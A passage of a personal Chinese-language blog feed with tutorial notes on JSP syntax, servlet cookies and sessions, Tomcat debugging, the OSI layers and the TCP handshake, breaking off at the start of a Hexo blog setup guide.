+    <content type="html"><![CDATA[<h1 id="JSP基本语法："><a href="#JSP基本语法：" class="headerlink" title="JSP基本语法："></a>JSP基本语法：</h1><h2 id="Declaretion-声明"><a href="#Declaretion-声明" class="headerlink" title="Declaretion  声明"></a>Declaretion  声明</h2><p>&lt;%! %&gt;    成员变量声明，只在servlet生成时声明一次，存在于整个servlet生命周期。（可声明方法）<br>&lt;% %&gt;    局部变量声明，每访问页面一次重新声明一次。（不可在其中声明方法）</p>
+<hr>
+<h2 id="Scriptlet-程序段"><a href="#Scriptlet-程序段" class="headerlink" title="Scriptlet  程序段"></a>Scriptlet  程序段</h2><p>&lt;%程序代码区%&gt;    可放入任何的Java程序代码</p>
+<hr>
+<h2 id="Expression-表达式"><a href="#Expression-表达式" class="headerlink" title="Expression  表达式"></a>Expression  表达式</h2><p>&lt;%= %&gt;<br>=后必须是字符串变量或者可以被转换成字符串的表达式，不需要以;结束</p>
+<hr>
+<h2 id="Comment-注释"><a href="#Comment-注释" class="headerlink" title="Comment  注释"></a>Comment  注释</h2><figure class="highlight jsp"><table><tr><td class="code"><pre><div class="line">&lt;!-- html注释 --&gt;	(在客户端浏览器中可以看到)</div><div class="line">&lt;%--.......--%&gt;</div><div class="line">&lt;%<span class="comment">//......%&gt;</span></div><div class="line">&lt;%<span class="comment">/*......*/</span>%&gt;</div></pre></td></tr></table></figure>
+<hr>
+<h2 id="Directives-指令（编译期间执行的指令）"><a href="#Directives-指令（编译期间执行的指令）" class="headerlink" title="Directives 指令（编译期间执行的指令）"></a>Directives 指令（编译期间执行的指令）</h2><figure class="highlight jsp"><table><tr><td class="code"><pre><div class="line">&lt;%<span class="meta">@Directive</span>属性=<span class="string">"属性值"</span>%&gt;</div></pre></td></tr></table></figure>
+<h3 id="常见Directive"><a href="#常见Directive" class="headerlink" title="常见Directive:"></a>常见Directive:</h3><h4 id="page"><a href="#page" class="headerlink" title="page:"></a>page:</h4><p>指明和JSP Container的沟通方式。<br>eg：<br><figure class="highlight jsp"><table><tr><td class="code"><pre><div class="line"> &lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"importList"</span>|	--引入java类</div><div class="line">				errorPage=<span class="string">"errorPageUrl"</span>|	--当前页面出错后所显示的页面内容</div><div class="line">				isErrorPage=<span class="string">"true|false"</span>|	--当前页面是否是显示错误的页面</div><div class="line">				contenType=<span class="string">"contentTypeInfo"</span></div><div class="line">%&gt;</div></pre></td></tr></table></figure></p>
+<h4 id="include："><a href="#include：" class="headerlink" title="include："></a>include：</h4><p>将指定的JSP程序或者HTML文件包含进来(会在JSP转换时期先将file设定的文件包含进来，然后开始转换及编译)</p>
+<ul>
+<li><p>用法：</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><div class="line">&lt;%<span class="meta">@include</span> file=<span class="string">"fileURL%"</span>&gt;</div></pre></td></tr></table></figure>
+</li>
+<li><p>特点:</p>
+<blockquote>
+<ul>
+<li>一般用于非动态的代码，不能在fileURL后面传参数</li>
+<li>执行效率比较高</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+<h4 id="taglib"><a href="#taglib" class="headerlink" title="taglib"></a>taglib</h4><blockquote>
+<p>JSP API允许您自定义JSP标签，这些看起来像HTML或XML标签的玩意就是用户自定义标签集了。<br>Taglib指令引入自定义标签集，识别库路径，并且鉴别自定义标签。<br><figure class="highlight jsp"><table><tr><td class="code"><pre><div class="line">Taglib指令的语法格式如下：</div><div class="line">&lt;%@ taglib uri=<span class="string">"uri"</span> prefix=<span class="string">"prefixOfTag"</span> &gt;</div><div class="line">uri属性告诉容器位置，prefix属性告诉容器多少位是自定义标签的标记。</div><div class="line">等价的XML语法如下：</div><div class="line">&lt;jsp:directive.taglib uri=<span class="string">"uri"</span> prefix=<span class="string">"prefixOfTag"</span> /&gt;</div></pre></td></tr></table></figure></p>
+</blockquote>
+<p>当使用一个自定义标签的时候，典型的格式为<prefix:tagname>。prefix与prefix属性所指定的前缀一样，tagname就是标签名称了。</prefix:tagname></p>
+<hr>
+<h2 id="Action动作指令（运行期间执行的指令）"><a href="#Action动作指令（运行期间执行的指令）" class="headerlink" title="Action动作指令（运行期间执行的指令）"></a>Action动作指令（运行期间执行的指令）</h2><h3 id="jsp-useBean"><a href="#jsp-useBean" class="headerlink" title="jsp:useBean"></a>jsp:useBean</h3><ul>
+<li><p>基本要素:</p>
+<blockquote>
+<ul>
+<li>必须要有一个无参数的构造器。在JSP元素创建Bean时会调用空构造器。</li>
+<li>Bean类应没有任何公共实例变量，不许直接访问实例变量。</li>
+<li>通过getter/setter方法读/写变量的值。</li>
+</ul>
+</blockquote>
+</li>
+<li><p>用法</p>
+<blockquote>
+<figure class="highlight"><table><tr><td class="code"><pre><div class="line">&lt;jsp:useBean id="beanName" scope="page|request|session|application"  class="package BeanClass" type="typeName" /&gt;	</div><div class="line">//id：对象实例名称</div><div class="line">//scope：Bean的有效范围,默认page.</div><div class="line">//class：Bean类的名称</div><div class="line">//type：Bean实例类型，可以是本类，或者其父类，或者实现的接口，默认本类。</div><div class="line"></div><div class="line"></div><div class="line">&lt;jsp:useBean...&gt;</div><div class="line">		&lt;jsp:setProperty...&gt;</div><div class="line">		&lt;jsp:getProperty...&gt;</div><div class="line">&lt;/jsp:useBean&gt;</div><div class="line">/*	jsp:setProperty格式:</div><div class="line">	&lt;jsp:setProperty name="beanName"</div><div class="line">	property="propertyName"|property="*"</div><div class="line">	value="property value"|param="paramName"/&gt;</div><div class="line">	*若为上一个页面form提交过来的数据，可以用property="*"。</div><div class="line">		//注：若request传输后输出乱码，可以使用request命令在获取前转码。request.setCharacterEncoding("GBK");</div><div class="line">	*相当于beanName.setPropertyName(value)方法调用(setXxx()方法)。</div><div class="line">	eg:	&lt;jsp:setProperty</div><div class="line">			name="entry"</div><div class="line">			property="itmeID"</div><div class="line">			value="&lt;%=request.getParameter("itmeID")%&gt;"	//等于param="itmeID"</div><div class="line">		/&gt;</div><div class="line">		作用：从request中读取itmeID,调用setItemID方法传入property的itemID</div><div class="line">	</div><div class="line">	</div><div class="line">	jsp:getProperty格式：</div><div class="line">	&lt;jsp:getProperty name="beanName"/&gt;</div><div class="line">	*相当于beanName.getPropertyName()方法调用(getXxx()方法)。</div><div class="line">	*调用原理：反射机制。</div><div class="line">	</div><div class="line">	</div><div class="line">*/</div></pre></td></tr></table></figure>
+</blockquote>
+</li>
+<li><p>注：<br>javaBean尽量放在包中使用，不要使用裸体类。</p>
+<blockquote>
+<p>eg:</p>
+<ul>
+<li>javaBean中定义包：package bean;</li>
+<li>编译后的bean文件放置目录WEB-INF\classes\bean</li>
+<li>jsp中导入&lt;%@ page import=”bean.*” %&gt;</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+<h3 id="jsp-include"><a href="#jsp-include" class="headerlink" title="jsp:include"></a>jsp:include</h3><p>该指令在转换期间不会被编译，只有当客户端请求时期被执行到才会被动态的编译载入</p>
+<ul>
+<li>用法:</li>
+</ul>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><div class="line">&lt;jsp:include page=<span class="string">"URLSpec"</span> flush=<span class="string">"true"</span>/&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="code"><pre><div class="line">&lt;jsp:include page="URLSpec" flush="true"&gt;</div><div class="line">	&lt;jsp:param name="ParamName" value="paramValue"/&gt;</div><div class="line">&lt;/jsp:include&gt;</div><div class="line">	//jsp:param:用来设定include对应的参数和值</div></pre></td></tr></table></figure>
+<h3 id="jsp-forward"><a href="#jsp-forward" class="headerlink" title="jsp:forward"></a>jsp:forward</h3><p>用于将一个jsp的内容传递到page所指定的JSP程序或者Servlet中处理（URL）</p>
+<ul>
+<li>用法：</li>
+</ul>
+<blockquote>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><div class="line">&lt;jsp:forward page=<span class="string">"urlSpec"</span> flush=<span class="string">"true"</span>/&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><div class="line">&lt;jsp:forward page=<span class="string">"urlSpec"</span>&gt;</div><div class="line">	&lt;jsp:param name=<span class="string">"paramName"</span> value=<span class="string">"paramValue"</span>/&gt;</div><div class="line">&lt;jsp:forward&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<ul>
+<li>特点：<blockquote>
+<ul>
+<li>执行Forward的页面和forward跳转到的页面用的是同一个request，服务器端直接将请求传递给目标页面。</li>
+<li>与之相对应的是response.sendRedirect，该方法向客户端返回待跳转页面的地址，客户端重新向待跳转页面发起请求。</li>
+<li>Forward可以直接在本URL后添加参数并传递给待跳转页面，response.sendRedirect不能在本URL后添加参数。</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+<h3 id="jsp-plugin"><a href="#jsp-plugin" class="headerlink" title="jsp:plugin"></a>jsp:plugin</h3><p>执行一个applet或Bean,有可能的话还要下载一个Java插件用于执行它。</p>
+<hr>
+<h2 id="内置对象"><a href="#内置对象" class="headerlink" title="内置对象"></a>内置对象</h2><h3 id="out"><a href="#out" class="headerlink" title="out"></a>out</h3><figure class="highlight jsp"><table><tr><td class="code"><pre><div class="line">println():		向客户端输出各种类型数据</div><div class="line">newLine():		输出一个换行符</div><div class="line">close():		关闭输出流</div><div class="line">flush():		输出缓冲区中的数据</div><div class="line">clearBuffer():	清除缓冲区里数据，同时输出到客户端</div><div class="line">clear():		清除缓冲区里数据但不输出到客户端</div><div class="line">getBufferSize():返回缓冲区的大小</div></pre></td></tr></table></figure>
+<h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><p>调用JSP页面的请求。通常request对象是javax.servlet.http.HttpServletRequest接口的一个实例。<br><figure class="highlight jsp"><table><tr><td class="code"><pre><div class="line">getMethod():					返回客户端向服务器端传送数据的方法。</div><div class="line">getParameter(String paramName):	返回客户端向服务器端传送的参数值，参数由paramName指定。</div><div class="line">getParameterValues(String name):获得客户端传给服务器端的所有参数的名字，结果是枚举类型数据(Enumeration)。</div><div class="line">getRequestURL():				获得发出请求字符串的客户端地址</div><div class="line">getRemoteAddr():				获得客户端的IP地址</div><div class="line">getRemoteHost():				获得客户端机器名称</div><div class="line">getServerName():				获得额服务器的名字</div><div class="line">getServletName():				客户端所请求的脚本文件路径</div><div class="line">getServerPort():				获得服务器端的端口</div></pre></td></tr></table></figure></p>
+<h3 id="response"><a href="#response" class="headerlink" title="response"></a>response</h3><p>返回给客户端的响应，是javax.servlet.http.HttpServletRequest接口的一个实例。<br>常用于设置HTTP标题、添加cookie、设置响应内容的类型和状态、发送HTTP重定向和编码URL。<br><figure class="highlight jsp"><table><tr><td class="code"><pre><div class="line">addCookie(Cookie cookie):				添加一个Cookie对象，用于在客户端保存特定信息。</div><div class="line">addHeader(String name String value):	添加HTTP头信息，该Header信息将发送到客户端。</div><div class="line">containsHeader(String name):			判断指定名字的HTTP文件头是否存在。</div><div class="line">sendError(<span class="keyword">int</span>):							向客户端发送错误的信息。(错误码)</div><div class="line">sendRedirect(String url):				重定向JSP文件。</div><div class="line">	和&lt;jsp:forward&gt;的区别：</div><div class="line">	sendRedirect通过客户端发起二次申请，不同的request对象</div><div class="line">	jsp:forward是同一个request在服务器内部转发</div><div class="line">setContentType(String contenType):		设置MIME类型和编码方式。</div></pre></td></tr></table></figure></p>
+<h3 id="pageContext"><a href="#pageContext" class="headerlink" title="pageContext"></a>pageContext</h3><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><h3 id="application"><a href="#application" class="headerlink" title="application"></a>application</h3><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><figure class="highlight jsp"><table><tr><td class="code"><pre><div class="line">从servlet文件跳转到jsp:</div><div class="line">getServletConfig().getServletContext().getRequestDispatcher(<span class="string">"/目标路径及跳转文件"</span>).forward(request,response)|.include()。</div><div class="line">从jsp跳转到servlet：</div><div class="line">&lt;jsp:forward page=<span class="string">"/目标路径及跳转文件"</span> /&gt;</div></pre></td></tr></table></figure>
+<h3 id="exception"><a href="#exception" class="headerlink" title="exception"></a>exception</h3><h3 id="page-1"><a href="#page-1" class="headerlink" title="page"></a>page</h3>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;JSP基本语法：&quot;&gt;&lt;a href=&quot;#JSP基本语法：&quot; class=&quot;headerlink&quot; title=&quot;JSP基本语法：&quot;&gt;&lt;/a&gt;JSP基本语法：&lt;/h1&gt;&lt;h2 id=&quot;Declaretion-声明&quot;&gt;&lt;a href=&quot;#Declaretion-声明&quot;
+    
+    </summary>
+    
+    
+      <category term="J2EE" scheme="http://jooop.github.io/tags/J2EE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>servlet中的cookie和session</title>
+    <link href="http://jooop.github.io/2016/10/11/Cookie%E5%92%8CSession/"/>
+    <id>http://jooop.github.io/2016/10/11/Cookie和Session/</id>
+    <published>2016-10-10T16:02:57.000Z</published>
+    <updated>2016-10-14T11:54:20.884Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Cookie和Session相关"><a href="#Cookie和Session相关" class="headerlink" title="Cookie和Session相关"></a>Cookie和Session相关</h1><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie:"></a>Cookie:</h2><blockquote>
+<p>因HTTP是无状态的协议，即客户端和服务器端不需要建立持久的链接，因此为了建立客户端浏览器与服务器的识别功能，需用Cookie解决。</p>
+<p>Cookie是在客户端请求服务器时，服务器为了记录该用户状态，用response向客户端浏览器返回一个cookie，浏览器将该cookie保存起来，待再次访问该服务器时，浏览器将cookie附于URL一同提交给服务器，服务器通过cookie信息识别用户身份与状态。</p>
+</blockquote>
+<h3 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h3><ol>
+<li>服务器可以向客户端写内容。</li>
+<li>只能是文本内容。</li>
+<li>客户端可以阻止服务器写入。</li>
+<li>只能取自己webapplication写入的cookie。</li>
+<li>一个servlet/jsp设置的cookies能够被同一个路径（指URL路径）下面或者子路径下面的servlet/jsp读取到，不能被父路径下的servlet/jsp读取到。</li>
+</ol>
+<h3 id="创建与使用："><a href="#创建与使用：" class="headerlink" title="创建与使用："></a>创建与使用：</h3><p>cookie以”名-值”对的形式保存数据</p>
+<h4 id="创建cookie"><a href="#创建cookie" class="headerlink" title="创建cookie:"></a>创建cookie:</h4><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">Cookie cookie = <span class="keyword">new</span> Cookie(name,value);		<span class="comment">//创建cookie对象，输入要保存的名值对</span></div><div class="line">cookie.setMaxAge(<span class="number">3600</span>);				<span class="comment">//age为cookie在客户端的最大生存周期。若不设置age，则为临时cookie，关闭浏览器则清除cookie</span></div><div class="line">response.addCookie(cookie);		<span class="comment">//添加cookie到response中</span></div></pre></td></tr></table></figure>
+<h4 id="从客户端拿到cookie："><a href="#从客户端拿到cookie：" class="headerlink" title="从客户端拿到cookie："></a>从客户端拿到cookie：</h4><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">Cookie[] cookies = request.getCookies();	<span class="comment">//获取request中的cookie数组</span></div><div class="line">cookies[i].getName();</div><div class="line">cookies[i].getValue();				<span class="comment">//获取客户端cookie中的名-值。</span></div></pre></td></tr></table></figure>
+<hr>
+<h2 id="Session"><a href="#Session" class="headerlink" title="Session:"></a>Session:</h2><blockquote>
+<p>记录在服务器端，与唯一的客户端浏览器窗口相关联</p>
+</blockquote>
+<h3 id="实现方式："><a href="#实现方式：" class="headerlink" title="实现方式："></a>实现方式：</h3><ol>
+<li>通过Cookie实现（将SessionId放在临时Cookie中）</li>
+<li>若浏览器不支持Cookie，可通过URL重写来实现<pre><code>response.encodeURL()
+(转码，URL后面加入SessionId,(表现为jsessionid=XXXXXXX……)客户端访问的同时在URL中将SessionId告知服务器。)
+</code></pre></li>
+</ol>
+<h4 id="通过HttpSession来读写Session"><a href="#通过HttpSession来读写Session" class="headerlink" title="通过HttpSession来读写Session"></a>通过HttpSession来读写Session</h4><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">HttpSesson mySession = request.getSession(<span class="keyword">true</span>);  <span class="comment">//如果request中原有session，就获取该session，若没有，就创建一个新的session</span></div><div class="line">						  <span class="comment">//request.getSession(false)只取，若无不会创建。）</span></div><div class="line">mySession.isNew();       		<span class="comment">//mySession是不是新创建的</span></div><div class="line">mySession.getId();				<span class="comment">//拿到id号</span></div><div class="line">mySession.CreationTime();			<span class="comment">//获取创建时间</span></div><div class="line">mySession.getLastAccessedTime();			<span class="comment">//最后一次访问时间</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">request.getRequestedSessionId();			<span class="comment">//获取request中的sessionId</span></div><div class="line">request.isRequestedSessionIdFromCookie();	<span class="comment">//是否是从Cookie中获取到的</span></div><div class="line">request.isRequestedSessionIdFromURL();		<span class="comment">//是否是从URL中获取到的</span></div><div class="line">request.isRequestedSessionIdValid();		<span class="comment">//是否有效</span></div></pre></td></tr></table></figure>
+<h4 id="Session过期时间：在web-xml中配置："><a href="#Session过期时间：在web-xml中配置：" class="headerlink" title="Session过期时间：在web.xml中配置："></a>Session过期时间：在web.xml中配置：</h4><figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">session-cofig</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">session-timeout</span>&gt;</span>30<span class="tag">&lt;/<span class="name">session-timeout</span>&gt;</span>      <span class="comment">&lt;!--30分钟过期--&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">session-cofig</span>&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="Session作用"><a href="#Session作用" class="headerlink" title="Session作用:"></a>Session作用:</h3><p>可以存内容，且该内容只有与Session相匹配的客户端窗口可以读取。<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">session.setAttribute(<span class="string">"accessCount"</span>,value);	<span class="comment">//在session中存入名为"accseeCount"的属性，值为value。(名字只能为String,值Object)</span></div><div class="line">session.getAttribute(<span class="string">"accseeCount"</span>);	<span class="comment">//拿到名为"accseeCount"的属性的值。</span></div></pre></td></tr></table></figure></p>
+<h3 id="Session访问路径问题："><a href="#Session访问路径问题：" class="headerlink" title="Session访问路径问题："></a>Session访问路径问题：</h3><blockquote>
+<p>同一个客户端窗口下，同一个application下的servlet/jsp可以共享同一个sessio。</p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;Cookie和Session相关&quot;&gt;&lt;a href=&quot;#Cookie和Session相关&quot; class=&quot;headerlink&quot; title=&quot;Cookie和Session相关&quot;&gt;&lt;/a&gt;Cookie和Session相关&lt;/h1&gt;&lt;h2 id=&quot;Cookie&quot;&gt;&lt;
+    
+    </summary>
+    
+    
+      <category term="J2EE" scheme="http://jooop.github.io/tags/J2EE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Java Servlet相关</title>
+    <link href="http://jooop.github.io/2016/10/09/Java-Servlet%E7%9B%B8%E5%85%B3/"/>
+    <id>http://jooop.github.io/2016/10/09/Java-Servlet相关/</id>
+    <published>2016-10-09T09:23:57.000Z</published>
+    <updated>2016-10-14T12:31:24.800Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="tomcat相关问题"><a href="#tomcat相关问题" class="headerlink" title="tomcat相关问题"></a>tomcat相关问题</h2><h3 id="tomcat启动时闪退问题调试方法："><a href="#tomcat启动时闪退问题调试方法：" class="headerlink" title="tomcat启动时闪退问题调试方法："></a>tomcat启动时闪退问题调试方法：</h3><p>dos中以debug模式启动tomcat<br><figure class="highlight dos"><table><tr><td class="code"><pre><div class="line">catalina debug</div><div class="line">run</div></pre></td></tr></table></figure></p>
+<p>然后从描述信息中找出错误问题。<br>例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">运行org.apache.catalina.startup.Bootstrap start</div><div class="line">VM 启动异常错误: VM initialization failed for: C:\Program Files\Java\jdk1.8.0_101\jre\bin\java -Djdk.tls.ephemeralDHKeySize=2048 -Djava.util.logging.config.file=C:\Program Files\tomcat8.0.37\conf\logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djava.endorsed.dirs=C:\Program Files\tomcat8.0.37\endorsed -classpath C:\Program Files\tomcat8.0.37\bin\bootstrap.jar;C:\Program Files\tomcat8.0.37\bin\tomcat-juli.jar -Dcatalina.base=C:\Program Files\tomcat8.0.37 -Dcatalina.home=C:\Program Files\tomcat8.0.37 -Djava.io.tmpdir=C:\Program Files\tomcat8.0.37\temp -Xdebug -Xrunjdwp:transport=dt_shmem,address=javadebug96829,suspend=y org.apache.catalina.startup.Bootstrap start</div><div class="line"></div><div class="line">错误: 找不到或无法加载主类 Files\tomcat8.0.37\conf\logging.properties</div><div class="line"></div><div class="line">致命错误:</div><div class="line">无法初始化目标 VM。</div></pre></td></tr></table></figure></p>
+<p>问题：已经有tomcat服务正在运行。<br>解决方法：找到开启的tomcat服务关闭，或者在任务管理器中关闭。</p>
+<hr>
+<h2 id="Java-Servlet相关问题"><a href="#Java-Servlet相关问题" class="headerlink" title="Java Servlet相关问题"></a>Java Servlet相关问题</h2><h3 id="使用getParameterMap-读取request并输出所有的参数"><a href="#使用getParameterMap-读取request并输出所有的参数" class="headerlink" title="使用getParameterMap()读取request并输出所有的参数"></a>使用getParameterMap()读取request并输出所有的参数</h3><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShowParameters</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</div><div class="line"></div><div class="line">	<span class="meta">@Override</span></div><div class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></div><div class="line">			<span class="keyword">throws</span> ServletException, IOException &#123;</div><div class="line">		response.setContentType(<span class="string">"text/html;charset=UTF-8"</span>);</div><div class="line">		PrintWriter out = response.getWriter();</div><div class="line">		String title = <span class="string">"Reading All Request Parameters"</span>;</div><div class="line">		out.println(<span class="string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;读取参数&lt;/title&gt;&lt;/head&gt;"</span></div><div class="line">				+ <span class="string">"&lt;body bgcolor='#FDF5E6'&gt;\n"</span> </div><div class="line">				+ <span class="string">"&lt;h1 align=center&gt;"</span> + title + <span class="string">"&lt;/h1&gt;\n"</span></div><div class="line">				+<span class="string">"&lt;table border=1 align=center&gt;\n"</span></div><div class="line">				+<span class="string">"&lt;tr bgcolor='#FFAD00'&gt;\n"</span></div><div class="line">				+<span class="string">"&lt;th&gt;Parameter Name&lt;th&gt;Parameter Value(s)"</span></div><div class="line">				);</div><div class="line"></div><div class="line">		Map&lt;String,String[]&gt; map = request.getParameterMap();    </div><div class="line">		<span class="keyword">for</span> (String key : map.keySet()) &#123;</div><div class="line">			out.print(<span class="string">"&lt;tr&gt;&lt;td&gt;"</span> + key + <span class="string">"\n&lt;td&gt;"</span>);</div><div class="line">			<span class="keyword">if</span>(map.get(key).length == <span class="number">1</span>)&#123;</div><div class="line">				String paramValue = map.get(key)[<span class="number">0</span>];</div><div class="line">				<span class="keyword">if</span>(paramValue.length() == <span class="number">0</span>)</div><div class="line">					out.println(<span class="string">"&lt;i&gt;No Value&lt;/i&gt;"</span>);</div><div class="line">				<span class="keyword">else</span></div><div class="line">					out.println(paramValue);</div><div class="line">			&#125;<span class="keyword">else</span>&#123;</div><div class="line">				out.println(<span class="string">"&lt;ul&gt;"</span>);</div><div class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; map.get(key).length; i++)&#123;</div><div class="line">					out.println(<span class="string">"&lt;li&gt;"</span> + map.get(key)[i]);</div><div class="line">				&#125;</div><div class="line">				out.println(<span class="string">"&lt;/ul&gt;"</span>);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		out.println(<span class="string">"&lt;/table&gt;\n&lt;/body&gt;&lt;/html&gt;"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;tomcat相关问题&quot;&gt;&lt;a href=&quot;#tomcat相关问题&quot; class=&quot;headerlink&quot; title=&quot;tomcat相关问题&quot;&gt;&lt;/a&gt;tomcat相关问题&lt;/h2&gt;&lt;h3 id=&quot;tomcat启动时闪退问题调试方法：&quot;&gt;&lt;a href=&quot;#tom
+    
+    </summary>
+    
+    
+      <category term="J2EE" scheme="http://jooop.github.io/tags/J2EE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>OSI七层、和TPC连接的建立与终止</title>
+    <link href="http://jooop.github.io/2016/10/02/OSI%E4%B8%83%E5%B1%82%E3%80%81%E5%92%8CTPC%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%BB%BA%E7%AB%8B%E4%B8%8E%E7%BB%88%E6%AD%A2/"/>
+    <id>http://jooop.github.io/2016/10/02/OSI七层、和TPC连接的建立与终止/</id>
+    <published>2016-10-02T03:03:36.000Z</published>
+    <updated>2017-04-07T03:10:15.039Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="OSI七层"><a href="#OSI七层" class="headerlink" title="OSI七层"></a>OSI七层</h2><table>
+<thead>
+<tr>
+<th>层次</th>
+<th style="text-align:center">协议</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>应用层</td>
+<td style="text-align:center">TELNET、FTP、TFTP、SMTP、SNMP、HTTP、BOOTP、DHCP、DNS</td>
+</tr>
+<tr>
+<td>表示层</td>
+<td style="text-align:center">文本：ASCII，EBCDIC；图形：TIFF，JPEG，GIF，PICT；声音：MIDI，MPEG，QUICKTIME</td>
+</tr>
+<tr>
+<td>会话层</td>
+<td style="text-align:center">NFS、SQL、RPC 、X-WINDOWS、ASP（APPTALK会话协议）、SCP</td>
+</tr>
+<tr>
+<td>传输层</td>
+<td style="text-align:center">TCP、UDP、SPX</td>
+</tr>
+<tr>
+<td>网络层</td>
+<td style="text-align:center">IP、IPX、ICMP、RIP、OSPF(Open Shortest Path First开放式最短路径优先)</td>
+</tr>
+<tr>
+<td>数据链路层</td>
+<td style="text-align:center">SDLC、HDLC、PPP、STP（Spanning Tree Protocol）、帧中继</td>
+</tr>
+<tr>
+<td>物理层</td>
+<td style="text-align:center">EIA/TIA RS-232、EIA/TIA RS-449、V.35、RJ-45</td>
+</tr>
+</tbody>
+</table>
+<h2 id="TPC连接的建立与终止"><a href="#TPC连接的建立与终止" class="headerlink" title="TPC连接的建立与终止"></a>TPC连接的建立与终止</h2><h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h3><ol>
+<li><p>第一次握手：建立连接时，客户端发送syn包(syn=j)到服务器，并进入SYN_SEND状态，等待服务器确认；</p>
+</li>
+<li><p>第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），即SYN+ACK包，此时服务器进入SYN_RECV状态；</p>
+</li>
+<li><p>第三次握手：客户端收到服务器的SYN＋ACK包，向服务器发送确认包ACK(ack=k+1)，此包发送完毕，客户端和服务器进入ESTABLISHED状态，完成三次握手。完成三次握手，客户端与服务器开始传送数据.</p>
+</li>
+</ol>
+<h3 id="TCP使用四次挥手关闭一个连接："><a href="#TCP使用四次挥手关闭一个连接：" class="headerlink" title="TCP使用四次挥手关闭一个连接："></a>TCP使用四次挥手关闭一个连接：</h3><p>第一次挥手：主动关闭方发送一个FIN并进入FIN_WAIT1状态</p>
+<p>第二次挥手：被动关闭方接收到主动关闭方发送的FIN并发送ACK，此时被动关闭方进入CLOSE_WAIT状态；主动关闭方收到被动关闭方的ACK后，进入FIN_WAIT2状态</p>
+<p>第三次挥手：被动关闭方发送一个FIN并进入LAST_ACK状态</p>
+<p>第四次挥手：主动关闭方收到被动关闭方发送的FIN并发送ACK，此时主动关闭方进入TIME_WAIT状态，经过2MSL时间后关闭连接；被动关闭方收到主动关闭方的ACK后，关闭连接</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;OSI七层&quot;&gt;&lt;a href=&quot;#OSI七层&quot; class=&quot;headerlink&quot; title=&quot;OSI七层&quot;&gt;&lt;/a&gt;OSI七层&lt;/h2&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;层次&lt;/th&gt;
+&lt;th style=&quot;text-align:center
+    
+    </summary>
+    
+    
+      <category term="J2EE" scheme="http://jooop.github.io/tags/J2EE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Hexo加Github Page建立个人博客简易用法</title>
+    <link href="http://jooop.github.io/2016/09/16/%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B/"/>
+    <id>http://jooop.github.io/2016/09/16/测试用例/</id>
+    <published>2016-09-16T09:23:57.000Z</published>
+    <updated>2016-10-10T13:35:33.136Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="配置工具"><a href="#配置工具" class="headerlink" title="配置工具"></a>配置工具</h2><h4 id="安装github工具"><a href="#安装github工具" class="headerlink" title="安装github工具"></a><a href="https://git-scm.com/downloads" target="_blank" rel="external">安装github工具</a></h4><blockquote>
+<p>配置并登陆（或者添加SSH Key）</p>
+</blockquote>
+<hr>
+<h4 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a><a href="https://nodejs.org/en/" target="_blank" rel="external">安装node.js</a></h4><blockquote>
+<p>下载4.x版本并安装，安装后默认会配置好path环境  </p>
+</blockquote>
+<hr>
+<h4 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h4><blockquote>
